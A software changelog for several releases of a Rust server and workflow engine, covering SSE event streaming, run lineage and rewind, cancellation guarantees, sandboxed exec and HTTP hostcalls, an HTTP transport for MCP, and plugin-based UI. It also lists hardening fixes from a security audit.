- **Improvements:** Steering composer on the run panel posts the existing screened `POST …/steering` (≤4000 chars, live remaining-char count).
- **Bug fixes:** Fixed a pre-existing runtime panic in the client: the plugin host was provided to the context as a bare `PluginHost` while consumers read it as `Signal<PluginHost>`, so mounting the Overview approval dock panicked. The provider now wraps the host in a signal.
- **Bug fixes:** Fixed an aborted-`git-stash` hazard during this release's development session (work recovered intact; no tree damage).
- **Security fixes:** The workflow event bridge applies the unconditional sanitize seam to outbox payloads BEFORE broadcast (invisible chars + markdown-ref constructs never reach the wire raw, even though engine state is machine-written), and the per-subscriber run-domain Read gate fails closed at fan-out.
- **Security fixes:** HTTP-mode MCP is fail-closed by construction: loopback bind by default, optional `MCP_HTTP_TOKEN` bearer checked BEFORE any request parsing (401 on missing/wrong credential), bodies capped at the 1 MiB stdio bound (413), non-JSON content types refused (415), GET/DELETE refused 405 (stateless server, no listen stream).
### Engineering record

- **Server M1 (outbox → SSE bridge):** new `spawn_workflow_event_worker` in `src/alert.rs` — every 2 s, per registered domain (webhook drainer's cadence + fail-soft discipline), pending `topic LIKE 'workflow/%'` rows advance via the existing `workflow::outbox::deliver` (audit row commits in the same tx; non-workflow topics like `steering` are never touched — engines consume those through their own surfaces) and publish `{kind:"workflow", payload:{…}}` on the bounded broadcast. Batch-bounded at 100 rows/domain/tick. Admission decision extracted as pure `workflow_event_admissible(kinds, authorized)`: opt-in required AND domain Read granted (default-off for old consumers). Pinned by `workflow_events_broadcast_with_domain_authz`, `sanitize_applies_to_workflow_payloads`, `kinds_filter_excludes_workflow_by_default`.
- **Client M2/M3/M4 (Witness):** new `client/src/events.rs` — parse/framing/backoff/dedup/envelope-adapter pure cores (`stream_reconnects_and_dedups_by_seq`, `ops_poll_falls_back_after_two_stream_failures`, `assembler_ingest_builds_review_job_from_proposal_events`) with the coroutine driver as thin plumbing in main.rs; `stream_client()` drops the 15 s total timeout that would sever healthy streams while keeping the 5 s handshake bound. New `client/src/panels/conversation.rs` keyed off the shared slot registry (`ui_renderer::chat_node_view` dispatch + generic-card fallback); answer binds SHA-256 of the exact `pending_question` bytes (server re-verifies in-tx). api.rs gains ~12 typed wrappers (`workflow_open/run/state/state_put/events/answer/steer/rewind/handoff/scoreboard`, `plugin_mount_evidence`, `boot_manifest`). Mount-evidence planning is pure (`plugins::mount_evidence_plan` + `manifest_digest`: `.wasm` preferred, absent manifest → metadata-only evidence — an unverifiable digest is never invented).
- **MCP HTTP transport:** `src/bin/mcp.rs` reuses the existing JSON-RPC core (`handle_line`) behind an axum router driven by `tower::ServiceExt::oneshot` in tests — no sockets needed for the pins: `http_post_roundtrips_jsonrpc`, `http_sse_negotiation_frames_the_response`, `http_notification_is_202_no_body`, `http_get_delete_refused`, `http_body_cap_refused_413`, `http_wrong_content_type_415`, `http_token_gate_fails_closed`, `sse_negotiation_and_framing_are_pure`. Content negotiation honors the client's `Accept`; legacy-era negotiation stays per-request (stateless ceiling documented below). Zero new dependencies (axum/tokio were already workspace deps).
- Tests: server main bin **812** / 6 ignored (+3: the three Witness bridge pins); lib **166** / 1 ignored (unchanged); mcp bin **30** (+11: the eight HTTP/SSE pins above plus framing helpers); brain CLI 6, eval 4, metrics 8, bench 8 (all unchanged); client **212** / 0 (+11: events cores ×5, mount-evidence ×3, conversation panel ×3). clippy `-D warnings` + fmt clean on both trees; lipstyk diff gate green (one rule disable added with written reason: `structural-repetition` fires on the ~90 deliberately one-line typed API wrappers — the repetition IS the wire contract); live smoke on a COPY of the real DB green: `brain doctor` clean, verify_chain intact, open-run → POST event → SSE delivery within one drain tick (both JSON and SSE framings), GET 405 / notification 202 verified against the running process.

### Honest ceilings

- The SSE bus is broadcast-lag semantics: a slow consumer drops missed events and re-syncs via the poll fallback (ops) or the lineage read (runs). The drain worker marks rows delivered after publish-attempt scheduling — a crash between deliver and broadcast loses that event from the LIVE feed (it remains fully queryable via `/workflow/runs/{id}/events`; the durable record is never lost, only the push).
- Domain fan-out authorization is evaluated at stream-delivery time against each subscriber's principal at connect; long-lived connections do not re-authorize mid-stream when roles change (reconnect picks up new grants).
- HTTP-mode MCP is stateless: no sessions, no server-initiated messages, no resumability tokens; legacy (2025-11-25) clients must send `initialize` per connection because nothing sticks between requests. Non-loopback binds without `MCP_HTTP_TOKEN` are possible but documented as misconfiguration, not prevented.
- Per-plugin bundle digests do not exist: compile-time plugins ship inside the single UI wasm bundle, so all mount-evidence rows carry the same manifest digest (the executing UI code), not per-plugin hashes.
- The ops poll fallback re-syncs alert regions only; the conversation panel relies on the persistent stream (its degraded mode is the manual reload / lineage refetch).

---



## [1.28.18] — 2026-08-23 — "Lineage": events remember where they came from

The outbox grows ancestry: `parent_id` links every event to the event it followed, checkpoints become events, rewind branches instead of deleting (pi's leaf-move discipline), and the I-PASS handoff packet becomes a real endpoint. Server `Cargo.toml`/lock 1.28.17 → **1.28.18**; SDK `brain-engine-sdk` 1.28.10 → **1.28.11**; schema 1.27.38 → **1.28.18** (`outbox.parent_id`, additive-NULL); `steward-harness` unchanged at 0.2.2; client + plugin unchanged.

### Release notes

- **Improvements:** Runs now have a tree, not a list: every outbox event can carry a `parent_event_id`, the engine threads its lineage cursor automatically, and after a rewind the next event parents at the rewind target. `GET /workflow/runs/{id}/events?branch=` reads any branch's ancestor chain, root-first.
- **Improvements:** Rewind-as-branch: `POST /workflow/runs/{id}/rewind` restores the state snapshot from a `workflow/checkpoint` event (or the run root) in one transaction, appending a `branches[]` marker to the engine-owned state. Nothing is ever deleted — the abandoned branch stays fully queryable. Write + approve role gate, reason screened like steering.
- **Improvements:** Checkpoints are events: at every step boundary the engine emits `workflow/checkpoint` carrying the full state snapshot (≤256 KiB guard — oversized states error loudly, never truncate).
- **Improvements:** The I-PASS handoff packet exists: `GET /workflow/runs/{id}/handoff` assembles Illness/Patient/Action/Situation/Safety from the run's own records (frontdoor seed, opening event, steps, latest checkpoint digest, SLA envelope, legal-hold + escalation status); `handoff_complete` derives exactly as the scoreboard derives it. CLI: `brain workflow handoff <run>` (with `--json`).
- **Security fixes:** None new: the rewind write rides the existing gates (domain Write, `approve` role, blocklist screening of the free-text reason) and commits its audit row in the same transaction as the state restore.
### Engineering record

- Fixed a pre-existing compile break on `main` found while wiring this release: `exec_allowlist()` called a non-existent `parse_word_list` helper (a leftover from the previous lipstyk cleanup pass); it now uses the sibling `word_list` like its HTTP twin. The tree at v1.28.17 did not compile as-committed.
- **M1 (migration + substrate):** additive `ALTER TABLE outbox ADD COLUMN parent_id INTEGER REFERENCES outbox(id)` guarded by a pragma probe (fresh DDL carries it too); schema stamp → 1.28.18; down-migration is a documented no-op (SQLite ALTER DROP is not portable — keep the column, drop the code). `outbox::enqueue_child` mirrors `enqueue`'s exactly-once discipline (INSERT OR IGNORE, audit only on first insert, replay never re-parents — first write wins) and returns `(created, event_id)` so callers link without a second read; `enqueue` now resolves the id too. `verify_outbox_lineage(conn, run_id)`: every non-root parent must exist, belong to the same run, and have a smaller id — cycles are impossible by construction, the check proves the stored rows obey it. Pinned by `verify_outbox_lineage_detects_orphans_and_cycles` (orphan via FK-disabled fixture row, cross-run parent, forward-id link, legacy all-NULL flat chain passes).
- **M2 (SDK ABI):** one additive defaulted method, `WorkflowHost::enqueue_with_parent(run_id, parent_event_id, topic, payload_json, key) -> Result<(bool, i64)>`; the default delegates to `enqueue` and reports the `0` sentinel id, so every existing impl (server host, remote host, test doubles) compiles unchanged. `SqliteWorkflowHost` overrides with the real thing through the same lane discipline.
- **M3 (engine + routes):** the crank threads `last_event` into every emission (host path and mediated Effects door — the events hostcall body gained optional `parent_event_id`, its receipt is now `enqueued:<created>:<event_id>`); the cursor seeds from the LAST `state.branches[].from_event`, which is what makes rewind work without a server push. `/events` POST gains `parent_event_id` → `{first, event_id}`; new GET `/events?branch=`, POST `/rewind`, GET `/handoff` handlers live in `src/handlers/workflow_lineage.rs` with the read seam on every emitted text field, probe-blind 404s, and WorkflowTx atomicity (transition + audit commit together). Route-coverage + route-authz guard tables extended (rewind Write, handoff Read; the shared `/events` path maps to the last-registered handler per the documented convention). openapi.yaml + docs/api.md updated in the same change.
- **M4 (I-PASS):** pure builder `crates/brain-engine-sdk/src/pure/handoff.rs` (no serde derive — input is pre-resolved facts, output a plain struct; deterministic over its inputs). The server handler gathers facts (run row, opening event, workflow_steps, step events, latest checkpoint digest, pending_question, SLA deadline — recorded value or the policy stamp over P3 at run-open, legal-hold count, escalation flag) and renders five `{title, lines}` sections.
- Tests: server bin **809** / 6 ignored (+7: `post_event_parents_and_returns_event_id`, `rewind_creates_branch_not_deletion`, `rewind_requires_checkpoint_target_and_approve_role`, `events_branch_query_walks_ancestors`, `handoff_route_assembles_five_pass_sections`, outbox lineage pins ×2 incl. the child audit-once pin); lib **166** / 1 ignored (outbox tests re-pinned for the `(bool, i64)` signature); SDK **101** / harness gold 6 + effects 3 + settle 4 + **lineage 2** (`checkpoint_payload_round_trips_state_exactly`, `rewind_creates_branch_and_replay_is_idempotent`). clippy `-D warnings` + fmt clean across all three workspaces; lipstyk diff-gate green with the two documented rule disables in `.lipstyk.toml` (spawn_blocking-owned clones; the named exec_allowlist seam).

### Honest ceilings

- Legacy runs stay flat: existing rows are NULL roots and verify treats them as valid flat sequences until new emissions chain them — an audit-shaped choice, not a migration gap.
- Root rewind (target = the run's first event when it is not a checkpoint) restores `{}`, not the original open state: pre-checkpoint history had no snapshot. The first checkpoint lands at step boundary 1, so the exposure is bounded to runs rewound before their first step.
- Branch selection is single-cursor: the engine follows the LAST `branches[]` marker; parallel sibling branches are queryable via `/events?branch=` but only one branch is "live" per run state (multi-head driving is later engine work, behind its own gate).
- The handoff packet is assembled evidence, not judgment: no LLM summarization of abandoned branches (pi's summary-at-ancestor is noted, not built), no cross-run dependency analysis; SLA falls back to a P3 policy stamp when the state records no deadline.
- `/health`'s chain watcher does not sweep outbox lineage — `verify_outbox_lineage` is callable and tested but not yet surfaced on a route or metric (Witness-tier work).

---



## [1.28.17] — 2026-08-23 — "Settle": the workflow invariants are law

DeepSeek Harness's settlement guarantees become contract tests BEFORE the engine grows: the result never rejects, cancel/dispose settle within bounded grace, events are observe-only clones, admission is capped, and the budget door fails closed — pinned as pure algebra in the SDK and tokio conformance in the engine. Server `Cargo.toml`/lock 1.28.16 → **1.28.17**; SDK `brain-engine-sdk` 1.28.9 → **1.28.10**; `steward-harness` 0.2.1 → **0.2.2**; client + plugin unchanged; no schema change.

### Release notes

- **Improvements:** The engine can no longer ship without its settlement guarantees: CI now runs the SDK's feature-gated workflow invariants explicitly (`cargo test -p brain-engine-sdk --features harness-kernel`) and a dedicated `steward-harness-gate` job (fmt + clippy + test) for the engine's tokio conformance.
- **Improvements:** Cooperative cancel is real: new `crank_cancellable` observes a shared `CancellationToken` at every step boundary and settles the run as `StoppedAt::Cancelled` exactly between steps — never mid-step, never splitting a CAS/event twin. Existing crank signatures are unchanged (additive).
- **Improvements:** Budget enforcement is now reachable and fail-closed: an exhausted window or an unenforceable budget denies the hostcall dispatch (`BudgetExceeded`) before any handler runs; previously the guard was dead code and `BudgetExceeded` could never fire.
- **Bug fixes:** Event idempotency keys used the PER-CRANK step counter (`run-{id}-evt-{steps_executed}`), so a cancelled-then-resumed run re-keyed its events from 1 and the exactly-once gate silently swallowed EVERY resumed step's event twin. Keys now derive from the PERSISTED step count — deterministic on replay, correct across resumes (pinned by `sigterm_settle_then_resume_exact` artifacts-equal-control plus the no-half-step twin audit).
- **Bug fixes:** `CancellationToken::clone` snapshotted the flag value instead of sharing it, so a cloned token never observed later cancels — cancellation propagation was silently broken for every clone holder. Clones now share one signal cell.
- **Security fixes:** None (the fail-closed budget denial above is hardening of an unreachable path, counted here as an improvement).
### Engineering record

- **M1 (SDK, pure algebra):** six settlement pins in `workflow.rs`, deterministic, no clocks/threads beyond the existing wall-clock mirrors: `result_never_rejects_any_terminal_path` (exhaustive over `completed|error|cancelled`; failure IS a value; once-semantics; cancel-after-terminal cannot override), `cancel_settles_within_bounded_grace_under_tick_model` (tick model: hanging scripts settle AT the grace bound via the abort path; cooperative engines settle before it), `dispose_waits_for_child_quiescence_within_bound` (a settling child keeps its own stop-reason, a never-settling child is force-completed at the bound, none left Running), `events_are_cloned_per_listener_and_throw_contained` (a mutating + throwing listener cannot tamper with or starve later listeners), `admission_enforces_max_total_agents_16_and_released_slots_readmit` (the 17th concurrent admit is refused regardless of arguments; released slots readmit). Where a pin met reality, reality moved minimally: the dispatch budget guard was rewritten to be live and deny-by-default on unenforceable windows, and `CancellationToken` gained shared-state clone semantics.
- **M2 (engine conformance, tokio):** four pins in `steward-harness/tests/settle.rs`: `crank_cancelled_mid_run_settles_at_step_boundary` (deterministic mid-run block-on-CAS double; state lands parseable on an exact step boundary, revision == recorded steps, every CAS twin paired with its `run-{id}-evt-{n}` event twin), `sigterm_settle_then_resume_exact` (cancel mid-run then resume; final artifacts equal the uncancelled control run field-for-field), `bounded_grace_beats_a_stuck_step` (without cancel the grace window elapses wedged; cancel ⇒ settled within the bound as `Cancelled` — never a hang, never a panic), `event_listeners_do_not_starve` (a panicking subscriber is contained at dispatch; later listeners receive every payload). Additive seams: `StoppedAt::Cancelled`, `crank_cancellable`, InMemHost `outbox_of`/`audit_log` test accessors; steward-harness tokio gains the `time`/`rt-multi-thread` features (feature-add, no new dependency).
- **M3 (CI):** `engine-crates` job runs the SDK settlement gate explicitly; new `steward-harness-gate` job compiles and tests the harness tree.
- Tests: server bin **802** / 6 ignored (+2 — the decision-signing-key serialization pins landed separately in this tree as `d43c060`); lib **166** / 1 ignored; brain CLI 19, mcp 21, bench 6; SDK **97** (+7); harness gold 6 + effects 3 + settle **4** (+4). clippy `-D warnings` + fmt clean across all three workspaces.

### Honest ceilings

- Cancel is COOPERATIVE at step boundaries: a step already executing to completion is not interrupted (there are no await points inside a step); bounded-grace force-settlement lives in the SDK's `CancelHandle::cancel_blocking`/dispose handles, not in the crank loop. Worker-thread isolation remains the deferred sandbox tier.
- `bounded_grace_beats_a_stuck_step` proves the driver settles without waiting out a stuck child and that the report carries `cancelled`; it does not kill the stuck OS thread (test doubles leak by design; production abort semantics arrive with the async step-executor tier).
- The budget denial bounds DISPATCH, not handler runtime: exec/http handlers enforce their own timeouts (30 s poll-kill, egress bounds) — an in-handler wall-clock check against `Budget` is Cockpit-tier work.
- No conformance matrix document — the tests ARE the matrix (per plan non-goals).

---



## [1.28.16] — 2026-08-23 — "Anvil": the ExecutionEnv is real

Every engine tool-effect goes through one mediated, countable, auditable door. The SDK's hostcall machinery (v1.28.2) was 80% of the idea; this release finishes it and closes the Rule-of-Two posture on the engine side. Server `Cargo.toml`/lock 1.28.15 → **1.28.16**; SDK `brain-engine-sdk` 1.28.8 → **1.28.9**; `steward-harness` 0.2.0 → **0.2.1**; client + plugin unchanged; no schema change.

### Release notes

- **Improvements:** All four remaining hostcall kinds now have server handlers: `exec` (argv-only, no shell, operator allowlist, cwd-pinned, output capped + sanitized), `http` (deny-by-default egress on the shared hardened client), `events` (the outbox as the ONLY event door, `workflow/*` topics only), and `ui` (an explicit named refusal — `reserved: lands with Cockpit`, not an absence). The dispatch table is exhaustive over the closed 7-kind vocabulary.
- **Improvements:** New mediated tool: `knowledge_suggest` — the domain-scoped, quarantine-clean (`flagged = 0`) suggestion read, sanitized before it crosses the boundary; cross-domain rows never answer.
- **Improvements:** Engines are countable: every canonicalized dispatch tallies into a per-run counter map (denials count too), surfaced additively as `CrankReport.hostcalls` — the audit chain stays the durable count.
- **Bug fixes:** `/workflow/scoreboard` no longer 500s: the audited-run linkage queried a plain-text `audit_events.target` column that the migrated DDL never had (same dead-code class as the removed executor INSERTs). The set now reconstructs via `hash("run:{id}")` membership over `target_hash` — the canonical target every run-bound substrate write emits — and stays fail-closed (unparseable/unlinkable = not green). Pinned by an in-memory DB regression test.
- **Security fixes:** Engine exec is fail-closed by default: `BRAIN_ENGINE_EXEC_ALLOWLIST` empty/absent = deny ALL exec, and the global deny still outranks any per-engine grant for other capabilities. Destructive commands are refused by the SDK mediation table even when allowlisted.
- **Security fixes:** Engine egress is deny-by-default: destination hosts must be in `BRAIN_ENGINE_HTTP_ALLOWLIST`; remote destinations are forced onto HTTPS (loopback may speak plain http); redirects are refused by the shared egress client.
- **Security fixes:** Exec stdout/stderr are each capped at 64 KiB and the whole result passes `sanitize_read` — PII in process output cannot cross into engine hands raw.
### Engineering record

- Client binaries (`brain`, `mcp`, `bench`, `brain-connector-stub`, `brain-connector-gh`) sent the WHOLE multi-line rotation token file as one Authorization header value; the embedded newline corrupted the request into an empty-body 400 before auth ran. All five now send exactly one slot via the shared `first_token` helper in `bin_common/http.rs` (pinned), which also fixes MCP `brain_search`/`ump.*` calls against rotation-slot files.
- **M1 (server):** `src/workflow/hostcalls.rs::build()` registers all seven kinds via the extracted `register_handlers`. `production_policy(engine)` grants the per-engine `exec` allow ONLY when `BRAIN_ENGINE_EXEC_ALLOWLIST` resolves non-empty (deny-cap removal + explicit per-engine override for THAT engine; every other engine falls through to Prompt == Denied). Exec: JSON `{"argv":[...]}` body, argv0 admission (exact or trailing-`/` directory prefix), `exec_mediation` refusal table, `BRAIN_ENGINE_WORKDIR` pin (default: process cwd — see ceilings), pipe-drain threads so a chatty child cannot wedge on a full pipe, poll-kill at the 30 s budget bound, `{exit_code, stdout, stderr}` sanitized. Http: `{"host","path"}` body, host shape validation, `build_url` scheme law (pinned pure), one-shot current-thread runtime for the sync handler seam. Events: run id in the dispatch name, topic prefix + payload size + key bounds enforced, replayed keys return the idempotent `enqueued:false` receipt. Every refusal path audits `workflow/hostcall/{kind}/denied` through the host chain.
- **M2 (SDK):** `HostCallContext` gains an append-only `BTreeMap<(label, kind), u64>` behind a `counters()` accessor — incremented for every canonicalized dispatch INCLUDING denials; plus `has_handler(kind)` (the exhaustiveness pin's read seam).
- **M3 (engine):** steward-harness `effects::Effects` is the ONE effect door — `exec`/`http`/`event`/`suggest`/`log` serialize the exact mediated body shapes and ride `dispatch`; crank event emissions route through it when provided (`crank_full`, additive — existing signatures unchanged) with the per-call tally landing in `CrankReport.hostcalls`. The reqwest transport stays solely in `remote_host.rs`, pinned by the include_str! self-grep `engine_has_no_direct_effect_paths`.
- **M4 (policy posture):** Prompt == Denied server-side documented (no interactive prompt without a human); SECURITY.md gains the engine hostcall mediations table (kind → handler → policy → audit shape).
- Tests (all plan-named pins green): `exec_denied_when_allowlist_empty`, `exec_runs_only_allowlisted_argv0_with_cwd_and_timeout`, `exec_output_is_sanitized_and_capped`, `http_denied_by_default_and_allowlisted_host_passes` (one-shot loopback HTTP server), `http_refuses_redirects_and_non_https_remote`, `events_handler_enforces_workflow_topic_prefix_and_size`, `ui_denied_with_named_reason`, `hostcall_table_is_exhaustive` (server + SDK sides), `dispatch_counter_increments_per_kind_and_report_carries_it`, `knowledge_suggest_is_domain_scoped_and_sanitized` (cross-domain + flagged-row leak probes), `engine_has_no_direct_effect_paths` (+ effects body-shape and loud-denial pins, SDK `dispatch_counter_increments_per_kind_and_label`). Env-mutating tests serialize on a lock (the compliance-test posture).
- Tests: server bin **800** passed / 6 ignored (+11); lib 165 / 1 ignored (the connector-stub spawn failure is the known environmental one — fails identically on clean main); brain 19, mcp 20, bench 5, eval 4, metrics 8; harness crate 6 gold pins + 3 effects tests; SDK **90** (+2). clippy `-D warnings` + fmt clean across all three workspaces.
- Review fixes (same release): hostcall audit targets are now `workflow/hostcall/<kind>/run:<id>` and `tenant_for_target` resolves a `run:` reference ANYWHERE in a target — handler audit rows land on the run's domain tenant instead of `global` (pinned by `hostcall_audits_resolve_the_run_domain_tenant`); `knowledge_suggest` against a missing run fails closed (`run not found`) instead of answering an empty ok.

### Honest ceilings

- No sandbox backend (landlock/gVisor/seccomp) — the allowlist+mediation door IS the boundary until one exists; engines hold bash-equivalent trust, this defends against buggy scripts, not hostile code.
- `Prompt == Denied` until Witness wires the GUI consent path; `ui` refuses with its named reason even where policy would admit it.
- Exec timeout is the fixed 30 s `Budget` default — the per-op budget seam (`Budget::op_secs` wired into the handler) lands with the GUI crank; workdir defaults to the process cwd when `BRAIN_ENGINE_WORKDIR` is unset (per-domain data-dir wiring arrives with Cockpit).
- The harness binary's default crank still rides the host trait's audited enqueue when no Effects door is supplied (also mediated, also audited); the tally then reads empty rather than lying about mediations that did not happen.
- DNS-rebinding across the egress client's connection-pool TTL remains the documented webhook ceiling, inherited here.
- The counters are an in-process tally, not durable state — the audit chain remains the authoritative count.

---



## [1.28.15] — 2026-08-23 — "FirstLight": the loop runs

The governed-workflow substrate (v1.27.30) gets its FIRST consumer: the steward-harness echo stub (15 lines, canned `{"ok":true}`) becomes the real engine — and the missing AskHuman link closes. Server `Cargo.toml`/lock 1.28.14 → **1.28.15**; SDK `brain-engine-sdk` 1.28.7 → **1.28.8**; `steward-harness` **0.2.0**; client + plugin unchanged; no schema change.

### Release notes

- **Improvements:** The loop runs: `brain workflow crank <run>` drives a real governed loop over the new substrate routes — load state → decide → one troubleshoot-core step per turn with gate waterfall, budget law (default 24, ceiling 1000), advisory steering drains, and an exactly-once event trail (`run-{id}-evt-{n}`).
- **Improvements:** AskHuman closes: `POST /workflow/runs/{id}/answer` digest-binds the answer to the live `pending_question` (SHA-256), appends `answers[]`, clears the question, and CAS-writes in ONE transaction.
- **Improvements:** New role-gated routes: `POST /workflow/runs` (open + audit row atomically), `GET|PUT /workflow/runs/{id}/state` (engine-exact CAS view, `409 {actual_revision}` on stale), `POST /workflow/runs/{id}/events` (exactly-once by key), `GET /workflow/runs/{id}/steering?since=` (advisory inbox drain). Engine paths carry the `workflow` role; answer carries `approve`.
- **Improvements:** `brain workflow` is real: `open` / `status` / `answer` / `approve` / `crank` (spawns the harness binary beside the CLI or via `BRAIN_STEWARD_BIN`; usage string updated).
- **Bug fixes:** Dead code removed: `src/workflow/executor.rs` + `consensus.rs` INSERTed into columns absent from the migrated DDL — they would have failed if ever called. Deleted (zero callers).
- **Security fixes:** Answer text runs the prompt-injection blocklist BEFORE it can reach run state (`400 answer_rejected`); answers are bounded at 4000 chars like steering.
- **Security fixes:** A refused answer (wrong digest / no pending question) leaves the run byte-identical — verified by pin.
### Engineering record

- The workflow handler family (existing run/steps/steering/suggestions/scoreboard surfaces included) used the raw `axum::Extension<Option<Principal>>` extractor, which 500s whenever the auth middleware does not inject an extension of exactly that type (opaque-token mode injects nothing) — found by live smoke. All workflow handlers now use the repo-standard infallible `OptPrincipal` extractor (`None` = loopback superuser posture unchanged); pinned over real HTTP in the smoke path.
- **M1 (SDK):** the four state keys are now NORMATIVE ABI — `Decision` + `decide` moved to `brain-engine-sdk::workflow_state` (behind `harness-kernel`; serde_json joins as an optional dep of that feature — written justification: the routing contract is JSON-typed by design and the server already builds the feature). Server `driver.rs` re-exports; its pins pass unchanged. New pin `decision_keys_are_frozen_abi` (fixture round-trip over all four keys + precedence).
- **M3 (engine):** `steward-harness` restructured lib+bin: `RemoteWorkflowHost` (loopback-http-only transport law, bearer ladder `BRAIN_TOKEN_FILE`→`BRAIN_TOKEN`→default install path, journaling tx) implements the SDK seam; `crank` loops `decide`→gate waterfall (over DECLARED constraints: `required_evidence[]`, `mutations`, `supporting_lines`, `needs_approval`)→CAS persist (one reload-retry on stale, then REPORT)→outbox log; `Done` folds scoreboard keys (`handoff_complete = status=="completed"`, never upgrading a recorded false) + final `workflow/end` event. Gate rejections become `DI_GATE_OPEN:*` finding rows, never silence. Gold-set pins: all 7 frozen cases replay end-to-end with artifacts equal field-for-field, second cranks enqueue ZERO events, budget stops at max with the 80% warn flag, ask-human stops/resumes, stale reports not panics.
- **M4:** server-side composition pin `cli_workflow_crank_reports_stopped_at` walks open → AskHuman stop shape → answer → decide-routes-Done through the routes.
- Tests: server bin **796** passed / 6 ignored (+11); lib 165 (+0 moved); harness crate **6** gold pins; SDK 88 (+1). clippy `-D warnings` + fmt clean on both workspaces.

### Honest ceilings

- `GET /workflow/runs/{id}/state` is deliberately NOT read-seam sanitized (engines CAS against exact stored bytes) — it requires the same domain Read grant PLUS the `workflow` engine role; the human view stays sanitized.
- The crank is request/CLI-scoped and human-cranked: no background worker, no autonomous steering (drained messages land in `state.steering[]` as advisories only).
- The remote host's `audit()` hook is a deliberate no-op — every durable effect is already audited server-side in-tx; no second chain entry is forged.
- Gate evaluation replays DECLARED constraints only; semantic truth is not re-derived from evidence bytes.
- Full spawn-path coverage of the external harness binary lives in the harness crate's own suite; the server-side pin exercises the route family the CLI composes.

---



## [1.28.14] — 2026-08-23 — the audit-hardening line (1.28.9 → 1.28.14)

**Security remediation of the 2026-08-23 independent audit** (server `Cargo.toml`/lock 1.28.8 → **1.28.14**; client bumped in-tree; plugin **0.4.7**; no schema change). Six themes shipped as individually-green commits: Gateweld, Seatbelt, Boundary (Fencepost3 + Provenance), Anchor (Legible + boot integrity), Bedrock, Parity.

### Release notes

- **Security fixes:** Approve without a `content_digest` is now `400 digest_required` — the display↔decision binding is mandatory (was an opt-in legacy branch). Plugin-mount evidence is server-verified against the live boot manifest BEFORE the Art.12 audit row is written (`409` on mismatch/unknown digest).
- **Security fixes:** New `BRAIN_WRITE_POSTURE=open|review` (default `open`; installer sets `review`). Under review, `/add`, `/ingest`, `/ingest/memory`, `/ingest/markdown`, `/ump/remember`, `/ump/revise` route through the existing proposal pipeline and return `202 proposal_pending` — agents propose, operators dispose. Origin labels corrected (`/ingest/memory` derives; UMP = `agent`; `/procedure` = `operator`, idempotent backfill) + the installer provisions a second agent token.
- **Security fixes:** The Rust MCP fence-welding forge is closed (`fence::wrap_fenced`: control chars strip BEFORE sentinels, no transform after); MCP tool results, `format_response`, and CLI recall/get output all share it. Recall hits serialize `origin`/`flagged`/`authority`; UMP recall records carry `untrusted: true`; `/export` gains a top-level `untrusted` marker with content verbatim.
- **Security fixes:** Boot chain means something: symlink containment (canonical, fail-closed), Ed25519-signed manifest (`sig`+`kid`) with `GET /app/boot.pub`, embedded fetch-and-refuse loader, digest-stamped service worker, external SW registration, CSP drops `'unsafe-eval'`. Client decision UI: full-content scroll dock, overview queue link-only, actions above content, invisible-char badge.
- **Security fixes:** Supply chain: all CI `uses:` SHA-pinned + least-privilege permissions; rerank model dir refuses CWD-relative paths; model-manifest generator + installer provisioning; UMP key dir fails closed on wide modes; security headers on 401/429 (outermost layer); webhook secret selection deterministic; context-drawer strip; screen evasion hardening (new invisible classes + matching-time fullwidth fold).
- **Security fixes:** Plugin 0.4.7: every interpolation inside the fence sanitized; error seam stripped; `baseUrl` scheme gate (https or loopback); `origin` provenance tag; drift reconciled and synced to openclaw.
### Engineering record
**Behavior-change ledger:** approve-without-digest now 400s; review posture 202s six write surfaces (env-gated, default unchanged); recall/export JSON gained additive fields; MCP/CLI output fenced; `/app` serves embedded loader/sw assets; plugin refuses remote cleartext `baseUrl`. Full findings-closure table: `AUDIT.md` §Register.


## [1.28.8] — 2026-08-23

**PluginUI** (server `Cargo.toml`/lock 1.28.7 → **1.28.8**; client 1.28.6 → **1.28.8**; crates + plugin unchanged; no schema change). The shell, the chat surface, and the HITL control panel are separate plugins composed through slots — approval workflow as a first-class chat plugin, with per-decision audit evidence.

### Release notes

- **Improvements:** The operator console is now composed from three built-in UI plugins — **ui-shell** (layout), **ui-chat** (conversation + input docks + keyed chat-node dispatch), **ui-control-panel** (approvals) — mounted by a plugin kernel over one shared slot registry. Third-party plugins insert between existing dock entries purely by registration (order is data); the approval dock sits at order 5, the queue at 20.
- **Improvements:** Approval decisions now ride a producer/consumer event contract: the server emits `proposal/open` and `proposal/decided` conversation events carrying whole-value checkpoints (content digest, SLA deadline, role gate), so the client's review-job node can join or replay from any stream point without its start event. Payloads are metadata only — never proposal content or PII.
- **Improvements:** The host publishes a boot manifest for the client bundle: `/app/boot.json` plus a `window.__BRAIN_BOOT__` script seat list every `pkg/` bundle with byte size and SHA-256, and the served shell entry auto-injects the script tag. A fail-closed loader validates the manifest (bounded paths under `pkg/`, known extensions, 64-hex digests) and refuses any bundle it cannot certify.
- **Security fixes:** Plugin mount/unmount is now recorded as audited evidence (`POST /workflow/plugins/mount`, Write-gated): each mount writes one hash-chained workflow audit row with the plugin identity, slot-registry revision, and bundle digest — Art. 12 record-keeping for the composition itself. Invalid input (hostile plugin names, malformed digests) is refused before any write.
- **Security fixes:** The digest-binding invariant is pinned at the new plugin boundary: an approve through the control-panel dock carries exactly the rendered `content_digest` (server 409s on drift); a reject carries none. The API CSP is unchanged — the boot seats ride the client policy.
### Engineering record

- **M1 (client):** new `client/src/plugins/` kernel — `PluginHost::boot()` mounts ui-shell → ui-chat → ui-control-panel into one shared `SlotRegistry`; declaration = authorization (registration into an undeclared family is a load error), double-declaring a family or slot key across owners fails loud with rollback of partial registrations, unmount reverses exactly the plugin's entries and bumps the registry revision (the `slots/changed` payload). The approval dock now consumes the shared host instead of building an ad-hoc registry.
- **M2:** server-side pure producer (`src/proposal_events.rs`: branded `ProposalId` wire form `p<id>`, open/decided builders) published on the `/events` feed under a new fixed `proposal` alert kind at proposal creation, approve, and reject; client-side consumer folds checkpoints onto the review-job node definition (branded-id match is fail-closed), keeps pending-until-start convergence, adds terminal state, and renders a pre-start fallback view node via `build_view_node`.
- **M3:** `frontend.rs` gains pure `boot_manifest(dist)` (sorted, SHA-256 per bundle) + `inject_boot_script` (idempotent, head-anchored); routes `/app/boot.json` + `/app/boot.js`; client `plugins/boot.rs` validates manifests fail-closed with a `certifies()` refusal predicate.
